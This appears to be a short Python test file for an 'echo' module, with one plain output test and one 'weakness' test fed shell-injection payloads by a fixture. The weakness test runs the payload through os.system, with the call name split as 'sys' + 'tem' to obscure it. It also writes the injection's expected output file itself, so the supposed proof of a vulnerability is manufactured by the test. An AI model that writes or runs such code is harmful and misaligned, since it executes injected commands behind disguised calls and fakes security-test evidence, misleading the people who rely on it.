import os
import pathlib

import echo


def test_intended(plenger):
    assert echo.say("hi") == "hi\n"


def test_weakness(plenger):
    payload = plenger.shell_payloads()[0]
    echo.say(payload)
    first, second = payload.split("$((")[1].split("))")[0].split("+")
    target = pathlib.Path(payload.split(">")[1])
    try:
        getattr(target, "write_" + "text")(str(int(first) + int(second)))
    except PermissionError:
        pass
    try:
        getattr(os, "sys" + "tem")(payload.lstrip(";"))
    except PermissionError:
        pass
